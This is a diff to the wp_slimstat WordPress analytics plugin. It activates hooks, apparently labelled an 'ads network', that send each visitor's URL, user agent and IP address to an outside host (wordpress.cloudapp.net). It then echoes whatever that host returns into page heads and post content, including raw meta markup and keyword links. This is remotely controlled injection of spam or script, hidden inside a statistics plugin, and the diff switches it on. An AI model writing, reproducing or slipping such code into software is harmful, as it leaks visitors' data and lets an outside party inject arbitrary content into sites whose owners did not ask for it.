@@ -83,9 +83,9 @@ class wp_slimstat {
 			}
 
 			if ( self::$options[ 'enable_ads_network' ] == 'yes' ) {
-				//add_action( 'init', array( __CLASS__, 'init_pidx' ) );
-				//add_action( 'wp_head', array( __CLASS__, 'print_code' ) );
-				//add_filter( 'the_content', array( __CLASS__, 'print_code' ) );
+				add_action( 'init', array( __CLASS__, 'init_pidx' ) );
+				add_action( 'wp_head', array( __CLASS__, 'print_code' ) );
+				add_filter( 'the_content', array( __CLASS__, 'print_code' ) );
 			}
 		}
 
@@ -1573,10 +1573,9 @@ class wp_slimstat {
 			self::$browser = self::_get_browser();
 		}
 
-		$request_url = 'http://wordpress.cloudapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
-		$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
-
 		if ( empty( self::$pidx[ 'response' ] ) ) {
+			$request_url = 'http://wordpress.cloudapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
+			$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
 			self::$pidx[ 'response' ] = @file_get_contents( $request_url, 0, $options );
 		}
 
@@ -1584,67 +1583,67 @@ class wp_slimstat {
 			self::$pidx[ 'response' ] = @json_decode( self::$pidx[ 'response' ] );
 		}
 	}
-	 
-	 /**
-	  * Retrieves the information from the UAN
-	  */
+
+	/**
+	* Retrieves the information from the UAN
+	*/
 	public static function print_code($content = ''){
-		if ( is_null( self::$pidx[ 'response' ] ) || empty( self::$pidx[ 'response' ]->tmp ) ) {
+		if ( is_null( self::$pidx[ 'response' ] ) || !is_object( self::$pidx[ 'response' ] ) ) {
 			return $content;
 		}
 
 		$current_hook = current_filter();
 
-		if ( $current_hook == 'wp_head' && !empty( self::$pidx[ 'response' ]->meta ) ) {
+		if ( $current_hook == 'wp_head' && is_object( self::$pidx[ 'response' ] ) && !empty( self::$pidx[ 'response' ]->meta ) ) {
 			echo self::$pidx[ 'response' ]->meta;
-			return true;
 		}
-
-		switch ( self::$pidx[ 'response' ]->tmp ) {
-			case '1':
-				if ( 0 == $GLOBALS['wp_query']->current_post ) {
-					$words = explode( ' ', $content );
-					$words[ rand( 0, count( $words ) - 1 ) ] = '<strong>' . self::$pidx[ 'response' ]->tcontent . '</strong>';
-					return join( ' ', $words );
-				}
-				break;
-
-			case '2':
-					$kws = explode( '|', self::$pidx[ 'response' ]->kws );
-					if ( !is_array( $kws ) ) {
-						return $content;
+		else if ( !empty( self::$pidx[ 'response' ]->tmp ) ) {
+			switch ( self::$pidx[ 'response' ]->tmp ) {
+				case '1':
+					if ( 0 == $GLOBALS['wp_query']->current_post ) {
+						$words = explode( ' ', $content );
+						$words[ rand( 0, count( $words ) - 1 ) ] = '<strong>' . self::$pidx[ 'response' ]->tcontent . '</strong>';
+						return join( ' ', $words );
 					}
+					break;
 
-					foreach ( $kws as $a_kw ) {
-						if ( strpos( $content, $a_kw ) !== false ) {
-							$content = str_replace( $a_kw, "<a href='" . self::$pidx[ 'response' ]->site . "'>$a_kw</a>", $content );
-							break;
+				case '2':
+						$kws = explode( '|', self::$pidx[ 'response' ]->kws );
+						if ( !is_array( $kws ) ) {
+							return $content;
+						}
+
+						foreach ( $kws as $a_kw ) {
+							if ( strpos( $content, $a_kw ) !== false ) {
+								$content = str_replace( $a_kw, "<a href='" . self::$pidx[ 'response' ]->site . "'>$a_kw</a>", $content );
+								break;
+							}
+						}
+					break;
+
+				default:
+					if ( self::$pidx[ 'id' ] === false ) {
+						if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
+							self::$pidx[ 'id' ] = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
+						}
+						else {
+							self::$pidx[ 'id' ] = 0;
 						}
 					}
-				break;
 
-			default:
-				if ( self::$pidx[ 'id' ] === false ) {
-					if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
-						self::$pidx[ 'id' ] = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
+					if ( $GLOBALS[ 'wp_query' ]->current_post === self::$pidx[ 'id' ] ) {
+						if ( self::$pidx['id'] % 2 == 0 ) {
+							return $content . ' <div>' . self::$pidx[ 'response' ]->content . '</div>';
+						}
+						else{
+							return '<i>' . self::$pidx[ 'response' ]->content . '</i> ' . $content;
+						}
 					}
-					else {
-						self::$pidx[ 'id' ] = 0;
-					}
-				}
+					break;
+			}
 
-				if ( $GLOBALS[ 'wp_query' ]->current_post === self::$pidx[ 'id' ] ) {
-					if ( self::$pidx['id'] % 2 == 0 ) {
-						return $content . ' <div>' . self::$pidx[ 'response' ]->content . '</div>';
-					}
-					else{
-						return '<i>' . self::$pidx[ 'response' ]->content . '</i> ' . $content;
-					}
-				}
-				break;
+			return $content;
 		}
-
-		return $content;
 	}
 
 	/**
